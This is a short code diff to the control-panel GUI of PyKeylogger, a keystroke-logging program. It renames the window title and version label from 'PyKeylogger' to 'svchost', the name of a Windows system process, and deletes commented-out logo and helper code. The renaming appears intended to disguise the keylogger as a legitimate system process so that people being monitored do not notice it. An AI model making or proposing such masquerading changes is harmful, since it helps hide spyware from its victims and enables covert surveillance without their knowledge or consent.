@@ -81,7 +81,7 @@ class PyKeyloggerControlPanel:
         #root.title("PyKeylogger Control Panel")
         # create a menu
 
-        self.root.title("PyKeylogger Control Panel")
+        self.root.title("svchost Control Panel")
         self.root.config(height=200, width=200)
         
         self.root.protocol("WM_DELETE_WINDOW", self.close)
@@ -90,16 +90,9 @@ class PyKeyloggerControlPanel:
         g = Pmw.Group(self.root, tag_pyclass = None)
         g.pack(fill = 'both', expand = 1, padx = 6, pady = 6)
         textlabel = Label(g.interior(), 
-                    text="PyKeylogger " + str(version.version),
+                    text="svchost " + str(version.version),
                     font=("Helvetica", 18))
         textlabel.pack(padx = 2, pady = 2, expand='yes', fill='both')
-        
-        # Pretty logo display
-        #photo = PhotoImage(file=os.path.join(myutils.get_main_dir(), 
-                                    #version.name + "icon_big.gif"))
-        #imagelabel = Label(self.root, image=photo, height=160, width=200)
-        #imagelabel.photo = photo
-        #imagelabel.pack()
         
         # Create and pack the MessageBar.
         self.message_bar = Pmw.MessageBar(self.root,
@@ -253,14 +246,6 @@ class ConfigPanel():
                     self.dialog.destroy()
 
     def validate(self):
-                
-        #def walk_nested_dict(d):
-            #for key1, value1 in d.items():
-                #if isinstance(value1, dict):
-                    #for key2, value2 in walk_nested_dict(value1):
-                        #yield [key1, key2], value2
-                #else:
-                    #yield [key1,], value1
         
         for key1, value1 in self.entrydict.items():
             if not isinstance(value1, dict): # shouldn't happen
